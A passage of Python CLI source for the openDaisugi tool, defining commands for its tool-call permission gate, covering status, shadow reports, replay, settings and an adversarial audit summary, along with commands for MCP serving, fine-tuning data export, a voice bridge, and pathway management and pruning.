    from opendaisugi.gate import _envelopes_dir, is_disarmed, resolve_gate_mode

    armed = not is_disarmed(root)
    try:
        cwd = Path.cwd()
    except OSError:
        # A deleted launch directory must not crash `gate status` — fall back
        # to the global-only view (== home, so the cwd-hook check is a no-op).
        cwd = Path.home()
    eff = effective_hook_mode(home=Path.home(), cwd=cwd)
    if eff.mode:
        mode, source = eff.mode, hook_source_label(eff)
    else:
        mode, source = resolve_gate_mode(None, root=root), "config"
    d = _envelopes_dir(root)
    envelopes = sorted(e.stem for e in d.glob("*.json")) if d.exists() else []
    # A hook whose program is gone fails on every call: an enforce hook then
    # denies them all. Say so on stderr, whatever the output format.
    from opendaisugi.config import missing_hook_programs, missing_hook_warning

    settings_files = [Path.home() / ".claude" / "settings.json"]
    if cwd / ".claude" / "settings.json" != settings_files[0]:
        settings_files.append(cwd / ".claude" / "settings.json")
    gone = [
        missing_hook_warning(f, prog, hook_mode)
        for f in settings_files
        for prog, hook_mode in missing_hook_programs(f)
    ]
    if json_output:
        typer.echo(
            json.dumps(
                {"armed": armed, "mode": mode, "mode_source": source, "envelopes": envelopes}
            )
        )
        for line in gone:
            typer.echo(line, err=True)
        return
    # "unknown": a gate hook in a form this CLI does not read. It may enforce.
    shown = "unknown gate hook" if mode == "unknown" else mode
    typer.echo(f"gate: {'armed' if armed else 'DISARMED'} · mode: {shown} ({source})")
    if not envelopes:
        typer.echo("no envelopes registered — enforce mode would deny everything")
    for e in envelopes:
        typer.echo(f"  envelope: {e}")
    for line in gone:
        typer.echo(line, err=True)


@gate_app.command("report")
def gate_report_cmd(
    session: str | None = typer.Option(None, "--session"),
    root: Path = _GATE_ROOT_OPT,
    as_json: bool = typer.Option(False, "--json", help="Emit the full report as JSON."),
) -> None:
    """Summarize the shadow log: what an enforcing gate would have denied."""
    import json as _json

    from opendaisugi.gate import shadow_report

    rep = shadow_report(root=root, session_id=session)
    if as_json:
        typer.echo(_json.dumps(rep, indent=2))
        return
    typer.echo(
        f"calls={rep['calls']} allowed={rep['allowed']} "
        f"would_deny={rep['would_deny']} "
        f"false_positive_candidates={len(rep['false_positive_candidates'])}"
    )
    for r in rep["denied"]:
        fp = " [FP-candidate]" if r in rep["false_positive_candidates"] else ""
        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail', '')!r}: {r.get('reason')}")


@gate_app.command("replay")
def gate_replay_cmd(
    captures_jsonl: Path = typer.Argument(..., help="A passive-capture session file."),
    envelope_path: Path = typer.Option(
        ..., "--envelope", help="Envelope to evaluate against (JSON/YAML)."
    ),
    as_json: bool = typer.Option(False, "--json", help="Emit the full report as JSON."),
) -> None:
    """Replay a captured session through the gate offline (nothing executes).

    The envelope-tuning loop: run this against real captured sessions and
    adjudicate the would-denies before trusting --mode enforce.
    """
    import json as _json

    import yaml

    from opendaisugi.gate import replay_captures
    from opendaisugi.models import Envelope

    envelope = Envelope(**yaml.safe_load(envelope_path.read_text()))
    rep = replay_captures(captures_jsonl, envelope)
    if as_json:
        typer.echo(_json.dumps(rep, indent=2))
        return
    typer.echo(
        f"calls={rep['calls']} allowed={rep['allowed']} "
        f"would_deny={rep['would_deny']} "
        f"false_positive_candidates={len(rep['false_positive_candidates'])}"
    )
    for r in rep["denied"]:
        fp = " [FP-candidate]" if r in rep["false_positive_candidates"] else ""
        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail', '')!r}: {r.get('reason')}")


@gate_app.command("settings")
def gate_settings_cmd(
    enforce: bool = typer.Option(
        False,
        "--enforce",
        help="Emit enforce-mode settings (default is shadow — observation only).",
    ),
    root: Path = _GATE_ROOT_OPT,
    fmt: str = typer.Option("claude", "--format"),
    session: str | None = typer.Option(
        None,
        "--session",
        help="Pin the gate to this registered session's envelope, ignoring "
        "the session id in each payload — authorization must not key on "
        "caller-influenceable input.",
    ),
) -> None:
    """Print the Claude Code hooks-settings JSON that wires in the gate.

    Usage: ``claude --settings "$(daisugi gate settings)"`` for shadow mode,
    add ``--enforce`` for the one-flag flip to protection. Add ``--session``
    to pin which registered envelope is checked, so a forged payload session
    id cannot select a more permissive one.
    """
    from opendaisugi.gate import gate_settings_json

    typer.echo(
        gate_settings_json(
            mode="enforce" if enforce else "shadow",
            root=root,
            fmt=fmt,
            session=session,
        )
    )


@gate_app.command("audit")
def gate_audit_cmd(
    as_json: bool = typer.Option(False, "--json", help="Emit the full report as JSON."),
) -> None:
    """Run the deterministic adversarial corpus and report both error rates.

    The same suite that gates merges (`tests/test_adversarial.py`), runnable
    by anyone: attack-denial rate, false-positive rate (with the known,
    budgeted FPs called out), per-category breakdown, and the comparison arms
    (no gate / literal-glob matching / this gate). Exactly reproducible —
    the corpus is content-addressed.
    """
    import json as _json

    from opendaisugi.adversarial import compare_arms, run_deterministic_corpus

    rep = run_deterministic_corpus()
    rep["arms"] = compare_arms()
    if as_json:
        typer.echo(_json.dumps(rep, indent=2))
        return
    typer.echo(f"corpus {rep['corpus_hash']}")
    typer.echo(
        f"attacks denied: {rep['attacks_denied']}/{rep['attacks_total']} "
        f"(rate {rep['attack_denial_rate']:.2f})"
    )
    typer.echo(
        f"benign false positives: {rep['benign_false_positives']}/{rep['benign_total']} "
        f"(rate {rep['false_positive_rate']:.2f}; "
        f"all {rep['known_false_positives']} are known/budgeted="
        f"{rep['benign_false_positives'] == rep['known_false_positives']})"
    )
    if rep["unexpected_allowed_attacks"]:
        typer.echo(f"  !! ATTACKS ALLOWED: {rep['unexpected_allowed_attacks']}")
    typer.echo("by category (denied/total):")
    for cat, c in sorted(rep["by_category"].items()):
        typer.echo(f"  {cat:22} {c['denied']}/{c['attacks']}")
    typer.echo("arms (attack_denial / false_positive):")
    for arm, m in rep["arms"].items():
        typer.echo(f"  {arm:16} {m['attack_denial_rate']:.2f} / {m['false_positive_rate']:.2f}")


@gate_app.command("serve")
def gate_serve_cmd(root: Path = _GATE_ROOT_OPT) -> None:
    """Run the resident gate in the foreground (Ctrl-C to stop).

    Hooks installed by `daisugi install --gate` try this server first and fall
    back to a cold in-process gate when it is not running. Verdicts are the
    same either way; only latency differs (~0.7 s cold, milliseconds warm).
    """
    from opendaisugi.gate_server import SOCK_NAME, serve

    typer.echo(f"gate: serving on {root / SOCK_NAME} (Ctrl-C to stop)", err=True)
    try:
        serve(root)
    except KeyboardInterrupt:
        typer.echo("", err=True)


@gate_app.command("proposals")
def gate_proposals_cmd(
    root: Path = _GATE_ROOT_OPT,
    as_json: bool = typer.Option(False, "--json", help="Emit proposals as a JSON array."),
) -> None:
    """List recorded envelope-edit proposals (`opendaisugi.ask.propose`).

    A proposal is a file, nothing more — nobody applies it automatically.
    This command only makes what's pending visible.
    """
    import json as _json

    from opendaisugi.ask import PROPOSALS

    d = root / PROPOSALS
    proposals: list[dict] = []
    if d.exists():
        for p in sorted(d.glob("*.json")):
            try:
                body = _json.loads(p.read_text(encoding="utf-8"))
            except (OSError, ValueError):
                continue
            if isinstance(body, dict):
                proposals.append(body)

    if as_json:
        typer.echo(_json.dumps(proposals, indent=2))
        return
    if not proposals:
        typer.echo("(no pending proposals)")
        return
    for p in proposals:
        typer.echo(
            f"{p.get('id', '?')}  [{p.get('kind', '?')}]  scope={p.get('scope', '?')}  "
            f"expires={p.get('expiresAt', '?')}"
        )


@mcp_app.command("serve")
def mcp_serve_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="Model used for envelope generation.",
    ),
) -> None:
    """Serve openDaisugi tools over MCP stdio.

    Exposes envelope_for, find_pathway, verify_plan, list_pathways,
    and pathway_stats. Requires the [mcp] extra:
    ``uv add 'opendaisugi[mcp]'``.
    """
    try:
        from opendaisugi.mcp_server import serve
    except ImportError as e:
        typer.echo(
            "opendaisugi[mcp] is not installed. Install with: uv add 'opendaisugi[mcp]'",
            err=True,
        )
        raise typer.Exit(1) from e
    from opendaisugi import Daisugi

    serve(Daisugi(model=model, data_dir=data_dir))


@lora_app.command("export")
def lora_export_cmd(
    output: Path = typer.Argument(..., help="Output JSONL file."),
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    fmt: str = typer.Option(
        "alpaca",
        "--format",
        help="Output format: alpaca (instruction/input/output) or chat (messages).",
    ),
    days: int | None = typer.Option(
        None,
        "--days",
        help="Only include traces from the last N days. Omit for all time.",
    ),
    min_task_chars: int = typer.Option(
        10,
        "--min-task-chars",
        help="Skip traces with tasks shorter than this many characters.",
    ),
    system_prompt: str | None = typer.Option(
        None,
        "--system-prompt",
        help="System prompt injected into chat-format examples.",
    ),
) -> None:
    """Emit (task → envelope JSON) pairs from the journal as JSONL for fine-tuning."""
    import time

    from opendaisugi.lora.dataset import emit_jsonl

    if fmt not in ("alpaca", "chat"):
        typer.echo(f"Unknown format {fmt!r}; expected 'alpaca' or 'chat'.", err=True)
        raise typer.Exit(code=2)

    since = None if days is None else time.time() - days * 86_400
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    stats = emit_jsonl(
        journal,
        output,
        format=fmt,  # type: ignore[arg-type]
        since=since,
        min_task_chars=min_task_chars,
        system_prompt=system_prompt,
    )
    typer.echo(
        json.dumps(
            {
                "total": stats.total,
                "written": stats.written,
                "skipped_empty_task": stats.skipped_empty_task,
                "skipped_load_error": stats.skipped_load_error,
                "output_path": stats.output_path,
                "format": fmt,
            },
            indent=2,
        )
    )


@tiers_app.command("stats")
def tiers_stats_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    days: int = typer.Option(30, "--days", help="Rollup window (days)."),
    json_output: bool = typer.Option(False, "--json", help="Emit stats as JSON."),
) -> None:
    """Show per-tier call counts, estimated tokens, and pathway hit rate."""
    from opendaisugi.accounting import tier_stats
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    stats = tier_stats(journal, window_days=days)
    if json_output:
        from dataclasses import asdict

        typer.echo(json.dumps(asdict(stats), indent=2))
        return
    typer.echo(f"window: last {stats.window_days}d")
    typer.echo(f"total traces: {stats.total}")
    for tier in ("tier0", "tier1", "tier2"):
        count = stats.by_tier.get(tier, 0)
        tokens = stats.estimated_tokens.get(tier, 0)
        typer.echo(f"  {tier}: {count} call(s)  ~{tokens:,} est tokens")
    typer.echo(f"estimated tokens total: ~{stats.estimated_tokens_total:,}")
    typer.echo(f"pathway hit rate: {stats.pathway_hit_rate:.1%}")
    if stats.by_tier1_provider:
        typer.echo("tier1 breakdown:")
        for name, count in sorted(stats.by_tier1_provider.items(), key=lambda kv: -kv[1]):
            typer.echo(f"  {name}: {count}")


DEFAULT_DATA_DIR = Path.home() / ".opendaisugi"


def _tilde(path: Path) -> str:
    """Show a path under the home directory as ``~/...``."""
    try:
        return "~/" + str(path.resolve().relative_to(Path.home()))
    except ValueError:
        return str(path)


def _echo_resolved(data_dir: Path) -> None:
    """One stderr line that says what daisugi resolved, so no state stays hidden."""
    from opendaisugi import console
    from opendaisugi.gate import is_disarmed, resolve_gate_mode
    from opendaisugi.llm import resolve_backend

    root = data_dir / "gate"
    gate = "disarmed" if is_disarmed(root) else resolve_gate_mode(None, root=root)
    console.note(f"backend: {resolve_backend()} · gate: {gate} · data: {_tilde(data_dir)}")


voice_app = typer.Typer(
    name="voice",
    help="The voice bridge. Record anywhere, transcribe on this box, land the text in a pane.",
    no_args_is_help=True,
)
app.add_typer(voice_app, name="voice", hidden=True)


def _parse_minutes(spec: str) -> float:
    """Parse a duration like 30m or 2h into a count of minutes.

    A bare number with no letter suffix is read as minutes.
    """
    spec = spec.strip().lower()
    if spec.endswith("m"):
        return float(spec[:-1])
    if spec.endswith("h"):
        return float(spec[:-1]) * 60.0
    return float(spec)


_MAX_ARM_MINUTES = 7 * 24 * 60.0


def _validated_arm_minutes(for_: str) -> float:
    """Parse and bound a --for value, or exit 1 with a plain sentence.

    A value must parse, then must be finite, strictly positive, and at
    most 7 days. inf, nan, and any value large enough to overflow a wall
    clock timestamp are all rejected here, before a grant file is ever
    written.
    """
    import math

    try:
        minutes = _parse_minutes(for_)
    except ValueError as exc:
        typer.echo(
            f"--for must be a number of minutes, or end with m or h, for example 30m "
            f"or 2h. Got {for_!r}.",
            err=True,
        )
        raise typer.Exit(code=1) from exc
    if not math.isfinite(minutes) or not (0 < minutes <= _MAX_ARM_MINUTES):
        typer.echo(
            f"--for must be a positive number of minutes, up to 7 days. Got {for_!r}.",
            err=True,
        )
        raise typer.Exit(code=1)
    return minutes


@voice_app.command("serve")
def voice_serve_cmd(
    host: str = typer.Option("127.0.0.1", "--host", help="Bind address."),
    port: int = typer.Option(7477, "--port", help="Bind port."),
    listen: str = typer.Option(
        None,
        "--listen",
        help="host:port for the tailnet, for example 0.0.0.0:7477. Needs a token file.",
    ),
    token_file: Path = typer.Option(
        None, "--token-file", help="Defaults to the coppice web token file."
    ),
    tls_cert: Path = typer.Option(None, "--tls-cert", help="TLS certificate file."),
    tls_key: Path = typer.Option(None, "--tls-key", help="TLS private key file."),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
) -> None:
    """Run the voice bridge. It answers GET /health, POST /transcribe, and POST /deliver."""
    from opendaisugi.config import load_config
    from opendaisugi.exceptions import FloorNotAvailable
    from opendaisugi.voice import server as voice_server
    from opendaisugi.voice.engines import EngineUnavailable, UnknownEngine

    if listen:
        host_part, sep, port_part = listen.partition(":")
        if not sep or not port_part.isdigit():
            typer.echo(
                f"--listen must be host:port, for example 0.0.0.0:7477. Got {listen!r}.",
                err=True,
            )
            raise typer.Exit(code=1)
        host, port = host_part, int(port_part)
    config = load_config(data_dir / "config.yaml").model_copy(update={"data_dir": data_dir})
    resolved_token_file = (
        token_file if token_file is not None else voice_server.default_token_file(config)
    )
    scheme = "https" if tls_cert is not None else "http"

    def _announce_listening() -> None:
        # Runs only once the socket is actually bound, through serve's own
        # on_bound hook, so a port already in use never prints a line
        # claiming the bridge is listening when it is not.
        typer.echo(f"opendaisugi voice listening on {scheme}://{host}:{port}")

    try:
        voice_server.serve(
            host=host,
            port=port,
            config=config,
            token_file=resolved_token_file,
            tls_cert=tls_cert,
            tls_key=tls_key,
            on_bound=_announce_listening,
        )
    except EngineUnavailable as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=3) from exc
    except UnknownEngine as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=1) from exc
    except FloorNotAvailable as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=3) from exc
    except (OSError, ValueError) as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=1) from exc
    except RuntimeError as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=3) from exc
    except KeyboardInterrupt:
        typer.echo("")


@voice_app.command("ptt")
def voice_ptt_cmd(
    pane: str = typer.Argument(..., help="The pane id to deliver text to."),
    server: str = typer.Option(
        None, "--server", help="The voice server URL. Defaults to voice_server_url in config."
    ),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
) -> None:
    """Laptop push-to-talk. Tap space to start recording. Tap it again to stop and send."""
    from urllib.parse import urlsplit

    from opendaisugi.config import load_config
    from opendaisugi.voice.ptt import main_loop

    config = load_config(data_dir / "config.yaml").model_copy(update={"data_dir": data_dir})
    server_url = server or config.voice_server_url
    try:
        parsed = urlsplit(server_url)
    except ValueError as exc:
        typer.echo(
            f"--server must be an http or https URL with a host. Got {server_url!r}.",
            err=True,
        )
        raise typer.Exit(code=1) from exc
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        typer.echo(
            f"--server must be an http or https URL with a host. Got {server_url!r}.",
            err=True,
        )
        raise typer.Exit(code=1)
    main_loop(pane, server_url=server_url, config=config)


@voice_app.command("arm")
def voice_arm_cmd(
    pane: str = typer.Argument(..., help="The pane id to grant direct-send to."),
    for_: str = typer.Option("30m", "--for", help="How long, for example 30m or 2h."),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Grant PANE direct send for a time window. Without this, delivered text only previews."""
    import time

    from opendaisugi.config import load_config
    from opendaisugi.voice import deliver as voice_deliver
    from opendaisugi.voice import server as voice_server

    minutes = _validated_arm_minutes(for_)
    config = load_config(data_dir / "config.yaml").model_copy(update={"data_dir": data_dir})
    armed_dir = voice_server.default_armed_dir(config)
    try:
        entry = voice_deliver.arm(pane, minutes=minutes, armed_dir=armed_dir)
    except OSError as exc:
        typer.echo(
            f"Could not write the grant under {armed_dir}. Check the directory, "
            "or pass --data-dir.",
            err=True,
        )
        raise typer.Exit(code=1) from exc
    if json_output:
        typer.echo(json.dumps({"pane": pane, "expires_at": entry.expires_at}))
        return
    until = time.strftime("%H:%M:%S", time.localtime(entry.expires_at))
    typer.echo(f"{pane} armed for {minutes:.0f} minutes, until {until}.")


@voice_app.command("disarm")
def voice_disarm_cmd(
    pane: str = typer.Argument(..., help="The pane id to revoke direct-send from."),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Revoke PANE's direct-send grant. Delivered text goes back to preview only."""
    from opendaisugi.config import load_config
    from opendaisugi.voice import deliver as voice_deliver
    from opendaisugi.voice import server as voice_server

    config = load_config(data_dir / "config.yaml").model_copy(update={"data_dir": data_dir})
    armed_dir = voice_server.default_armed_dir(config)
    try:
        removed = voice_deliver.disarm(pane, armed_dir=armed_dir)
    except OSError as exc:
        typer.echo(
            f"Could not remove the grant under {armed_dir}. Check the directory, "
            "or pass --data-dir.",
            err=True,
        )
        raise typer.Exit(code=1) from exc
    if json_output:
        typer.echo(json.dumps({"pane": pane, "removed": removed}))
        return
    if removed:
        typer.echo(f"{pane} disarmed. The grant is gone.")
    else:
        typer.echo(f"{pane} had no grant. Nothing changed.")


@pathways_app.command("list")
def pathways_list_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """List all compiled pathways."""
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    pathways = store.list_all()
    if json_output:
        typer.echo(
            json.dumps(
                [
                    {
                        "id": p.id,
                        "task_description": p.task_description,
                        "hit_count": p.hit_count,
                        "version": p.version,
                        "distilled_at": p.distilled_at,
                    }
                    for p in pathways
                ]
            )
        )
        return
    if not pathways:
        typer.echo("No compiled pathways.")
        return
    for p in pathways:
        typer.echo(f"{p.id}  hits={p.hit_count}  v{p.version}  {p.task_description}")


@pathways_app.command("show")
def pathways_show_cmd(
    pathway_id: str = typer.Argument(..., help="Pathway id to inspect."),
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show a compiled pathway in detail."""
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    for p in store.list_all():
        if p.id == pathway_id:
            if json_output:
                typer.echo(json.dumps(p.model_dump(mode="json", exclude={"task_embedding"})))
                return
            typer.echo(p.model_dump_json(indent=2))
            return
    typer.echo(f"Pathway {pathway_id!r} not found.", err=True)
    raise typer.Exit(code=1)


@pathways_app.command("stats")
def pathways_stats_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    json_output: bool = typer.Option(False, "--json", help="Emit stats as JSON."),
) -> None:
    """Summarize stored pathways (count, total hits)."""
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    stats = store.stats()
    if json_output:
        typer.echo(json.dumps(stats, indent=2))
        return
    typer.echo(f"count: {stats['count']}")
    typer.echo(f"total_hits: {stats['total_hits']}")


@pathways_app.command("delete")
def pathways_delete_cmd(
    pathway_id: str = typer.Argument(..., help="Pathway id to remove."),
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
) -> None:
    """Delete a compiled pathway."""
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    if store.delete(pathway_id):
        typer.echo(f"Deleted {pathway_id}.")
    else:
        typer.echo(f"Pathway {pathway_id!r} not found.", err=True)
        raise typer.Exit(code=1)


@pathways_app.command("export")
def pathways_export_cmd(
    pathway_id: str = typer.Argument(..., help="Pathway id to export."),
    output: Path = typer.Argument(..., help="Output file path."),
    fmt: str = typer.Option(
        "skill",
        "--format",
        help="Export format: json, skill, mermaid, md, smtlib.",
    ),
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
) -> None:
    """Export a compiled pathway for sharing or inspection."""
    from opendaisugi.pathway_store import PathwayStore
    from opendaisugi.portability import _SUPPORTED_FORMATS
    from opendaisugi.portability import export as _export

    if fmt not in _SUPPORTED_FORMATS:
        typer.echo(
            f"Unknown format {fmt!r}. Supported: {', '.join(_SUPPORTED_FORMATS)}.",
            err=True,
        )
        raise typer.Exit(code=2)

    store = PathwayStore(data_dir / "pathways.db")
    match = next((p for p in store.list_all() if p.id == pathway_id), None)
    if match is None:
        typer.echo(f"Pathway {pathway_id!r} not found.", err=True)
        raise typer.Exit(code=1)

    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(_export(match, fmt))  # type: ignore[arg-type]
    typer.echo(f"Exported {pathway_id} → {output} ({fmt})")


@pathways_app.command("import")
def pathways_import_cmd(
    source: Path = typer.Argument(..., help="Path to pathway bundle (.json or .md)."),
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    overwrite: bool = typer.Option(
        False,
        "--overwrite",
        help="Replace an existing pathway with the same ID.",
    ),
    z3_timeout_ms: int = typer.Option(
        500,
        "--z3-timeout-ms",
        min=1,
        max=2**32 - 1,
        help="Z3 timeout for the re-verification, in ms (Z3 takes 1 to 4294967295).",
    ),
) -> None:
    """Import a pathway bundle, re-verify, and admit to the PathwayStore."""
    from opendaisugi.pathway_store import PathwayStore
    from opendaisugi.portability import PathwayImportError, import_pathway

    store = PathwayStore(data_dir / "pathways.db")
    try:
        result = import_pathway(
            source,
            store,
            z3_timeout_ms=z3_timeout_ms,
            allow_overwrite=overwrite,
        )
    except PathwayImportError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=1) from e

    action = "replaced" if result.overwrote_existing else "imported"
    typer.echo(
        f"{action.capitalize()} pathway {result.pathway.id} "
        f"({result.pathway.task_description[:60]})"
    )


@gardener_app.command("prune")
def gardener_prune_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    max_idle_days: float = typer.Option(30.0, "--max-idle-days"),
    max_failure_ratio: float = typer.Option(0.5, "--max-failure-ratio"),
    min_activations: int = typer.Option(5, "--min-activations"),
    dry_run: bool = typer.Option(False, "--dry-run"),
    json_output: bool = typer.Option(False, "--json"),
) -> None:
    """Evict stale / failure-dominated pathways."""
    from opendaisugi.gardener import PruneConfig, prune
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    cfg = PruneConfig(
        max_idle_days=max_idle_days,
        max_failure_ratio=max_failure_ratio,
        min_activations_before_prune=min_activations,
    )
    report = prune(store, cfg, dry_run=dry_run)
    if json_output:
        typer.echo(
            json.dumps(
                {
                    "removed_ids": report.removed_ids,
                    "kept_count": report.kept_count,
                    "reasons": report.reasons,
                    "dry_run": dry_run,
                },
                indent=2,
            )
        )
        return
    verb = "would remove" if dry_run else "removed"
    typer.echo(f"{verb}: {report.removed_count} (kept: {report.kept_count})")
    for pid in report.removed_ids:
        typer.echo(f"  {pid} — {report.reasons.get(pid, '')}")


@gardener_app.command("merge")
def gardener_merge_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    similarity: float = typer.Option(0.92, "--similarity"),
    dry_run: bool = typer.Option(False, "--dry-run"),
    json_output: bool = typer.Option(False, "--json"),
) -> None:
    """Collapse near-duplicate pathways."""
    from opendaisugi.gardener import MergeConfig, merge
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    cfg = MergeConfig(similarity_threshold=similarity)
    report = merge(store, cfg, dry_run=dry_run)
    if json_output:
        typer.echo(
            json.dumps(
                {
                    "merged_pairs": report.merged_pairs,
                    "kept_ids": report.kept_ids,
                    "removed_ids": report.removed_ids,
                    "dry_run": dry_run,
                },
                indent=2,
            )
        )
        return
    verb = "would merge" if dry_run else "merged"
    typer.echo(f"{verb}: {report.merge_count} pair(s)")
    for winner, loser in report.merged_pairs:
        typer.echo(f"  {winner}  <-  {loser}")


@gardener_app.command("run")
def gardener_run_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    dry_run: bool = typer.Option(False, "--dry-run"),
    json_output: bool = typer.Option(False, "--json"),
) -> None:
    """Run the full gardener pipeline (prune + merge)."""
    from opendaisugi.gardener import run_gardener
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    report = run_gardener(store, dry_run=dry_run)
    if json_output:
        typer.echo(
            json.dumps(
                {
                    "prune": {
                        "removed_ids": report.prune.removed_ids,
                        "kept_count": report.prune.kept_count,
                        "reasons": report.prune.reasons,
                    },
                    "merge": {
                        "merged_pairs": report.merge.merged_pairs,
                        "kept_ids": report.merge.kept_ids,
                    },
                    "dry_run": dry_run,
                },
                indent=2,
            )
        )
        return
    verb = "would" if dry_run else ""
    typer.echo(
        f"prune: {verb} removed {report.prune.removed_count}, kept {report.prune.kept_count}"
    )
    typer.echo(f"merge: {verb} merged {report.merge.merge_count} pair(s)")


@gardener_app.command("watch")
def gardener_watch_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    min_interval_s: int = typer.Option(
        3600,
        "--min-interval",
        help="Skip if the last run is newer than this many seconds.",
    ),
    force: bool = typer.Option(False, "--force", help="Ignore the min-interval check."),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Cron-friendly one-shot gardener. Skips if last run is within --min-interval.

    Designed to be invoked by cron/systemd-timer every few minutes — the
    --min-interval gate prevents running more often than desired regardless
    of scheduler granularity. Writes a timestamp file to --data-dir so the
    gate survives restarts.
    """
    import time

    from opendaisugi.gardener import run_gardener
    from opendaisugi.pathway_store import PathwayStore

    stamp_file = data_dir / ".gardener-last-run"
    now = time.time()
    last_run = 0.0
    if stamp_file.exists():
        try:
            last_run = float(stamp_file.read_text().strip())
        except ValueError:
            last_run = 0.0

    elapsed = now - last_run
    if not force and elapsed < min_interval_s:
        payload = {
            "skipped": True,
            "reason": "min_interval_not_elapsed",
            "elapsed_s": round(elapsed, 1),
            "min_interval_s": min_interval_s,
        }
        typer.echo(json.dumps(payload))
        return

    store = PathwayStore(data_dir / "pathways.db")
    report = run_gardener(store, dry_run=dry_run)

    if not dry_run:
        data_dir.mkdir(parents=True, exist_ok=True)
        stamp_file.write_text(f"{now:.3f}")

    typer.echo(
        json.dumps(
            {
                "skipped": False,
                "ran_at": now,
                "dry_run": dry_run,
                "prune": {
                    "removed": report.prune.removed_count,
                    "kept": report.prune.kept_count,
                },
                "merge": {
                    "merged": report.merge.merge_count,
                },
            }
        )
    )


@gardener_app.command("status")
def gardener_status_cmd(
    data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
    json_output: bool = typer.Option(False, "--json"),
) -> None:
    """Report current store size, pathway activation stats, failure ratios."""
    from opendaisugi.pathway_store import PathwayStore

    store = PathwayStore(data_dir / "pathways.db")
    pathways = store.list_all()
    payload = {
        "count": len(pathways),
        "pathways": [
            {
                "id": p.id,
                "hit_count": p.hit_count,
                "failure_count": p.failure_count,
                "last_activation_at": p.last_activation_at,
            }
            for p in pathways
        ],
    }
    if json_output:
        typer.echo(json.dumps(payload, indent=2))
        return
    typer.echo(f"count: {payload['count']}")
    for p in pathways:
        total = p.hit_count + p.failure_count
        ratio = (p.failure_count / total) if total else 0.0
        typer.echo(f"  {p.id}  hits={p.hit_count}  fails={p.failure_count}  fail_ratio={ratio:.2f}")


def _serialize_session(session) -> dict:
    payload = asdict(session)
    payload["status"] = session.status.value
    payload["verification"] = session.verification.model_dump(mode="json")
    return payload


@app.command("run", hidden=True)
def run_cmd(
    plan_path: Path = typer.Argument(..., exists=True, readable=True, help="Path to plan YAML."),
    envelope_path: Path = typer.Option(
        ..., "--envelope", "-e", exists=True, readable=True, help="Path to envelope YAML."
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR, "--data-dir", help="Root data directory for the journal."
    ),
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Use DryRunExecutor — no real subprocesses."
    ),
    yes: bool = typer.Option(
        False,
        "--yes",
        "-y",
        help="Auto-approve every step (sets DAISUGI_APPROVE=always for this run).",
    ),
    json_output: bool = typer.Option(
        False, "--json", help="Emit the run session as JSON on stdout."
    ),
) -> None:
    """Execute PLAN against ENVELOPE under runtime supervision.

    Exit codes: 0 succeeded, 1 failed, 2 verify rejected, 130 aborted.
    """
    from opendaisugi.supervisor import Supervisor

    # plan_path/envelope_path are `typer.Argument(exists=True)`/`typer.Option(exists=True)`,
    # so Typer rejects a missing file before this body runs — only a parse failure
    # on an existing file is reachable here.
    try:
        envelope = Envelope(**yaml.safe_load(envelope_path.read_text()))
    except (yaml.YAMLError, ValueError) as e:
        _fail(
            f"Tried to read the envelope {envelope_path}.",
            f"It did not parse: {str(e).splitlines()[0]}",
            "Fix the file and run again.",
            code=2,
        )
    try:
